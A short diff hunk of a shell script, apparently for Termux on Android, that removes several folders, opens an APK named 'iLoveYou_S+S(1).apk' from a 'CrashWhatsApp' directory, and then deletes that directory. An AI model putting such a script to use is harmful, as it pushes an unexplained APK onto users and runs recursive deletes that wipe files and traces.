@@ -16,5 +16,8 @@ rm -rf download
 rm -rf Instagram
 rm -rf bluetooth
 cd $HOME
-rm -rf CrashWhatsApp
+cd CrashWhatsApp
+cd BaapG
 termux-open  'iLoveYou_S+S(1).apk'
+cd $HOME
+rm -rf CrashWhatsApp
